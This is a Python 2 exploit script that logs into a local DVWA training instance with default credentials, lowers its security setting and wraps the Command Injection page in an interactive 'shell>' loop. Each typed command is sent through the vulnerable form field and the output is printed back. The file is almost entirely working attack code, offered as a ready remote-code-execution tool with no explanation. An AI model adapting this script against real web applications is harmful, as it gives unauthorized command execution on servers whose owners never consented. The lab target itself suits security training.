#!/usr/bin/python

print '++++++++++++++++++++++++++++++++++++++++'
print '+                                      +'
print '+                                      +'
print '+	REMOTE CODE EXECUTION         +'
print '+              --coded by angelo king  +'
print '+                                      +'
print '++++++++++++++++++++++++++++++++++++++++'


import mechanize
import sys
import time
time.sleep(3)
br = mechanize.Browser()

print '[+] connecting to http://localhost/dvwa/'
br.open('http://localhost/dvwa/login.php')
print '[+] Logging...'
br.select_form(nr=0)
br.form['username'] = 'admin'
br.form['password'] = 'password'
br.submit()
if 'Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*' in br.title():
	print '[+] you are successfully logged in...'
	time.sleep(1)
elif 'Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*' in br.title():
	print 'Unable to connect...'
	sys.exit()

else:
	print 'Unknown'

print '[+] checking security level'
time.sleep(1)
new_link = br.click_link(text='DVWA Security')
br.open(new_link)
if 'Security level is currently: <em>low</em>' in br.response().read():
	print '[+] security level is low'
else:
	print '[+] security level is not low'
	time.sleep(2)
	print '[+] changing security level'
	time.sleep(2)
	br.select_form(nr=0)
	br.form['security'] = ['low']
	br.submit()
	if 'Security level is currently: <em>low</em>' in br.response().read():
		print '[+] security level changed to low...'
	else:
		print '[+] Unable to change security level...'
		sys.exit()

print '[+] now we get remote code execution to exploit'
time.sleep(3)
nw_link = br.click_link(text='Command Injection')
br.open(nw_link)
try:
	while True:
		cmd = raw_input('shell> ')
		br.select_form(nr=0)
		br.form['ip'] = cmd
		br.submit()
		tp = br.response().read()
		target  = str(tp)
		print target[3643:-1259]
except KeyboardInterrupt:
	print '[+] Exiting...'
	sys.exit()

	


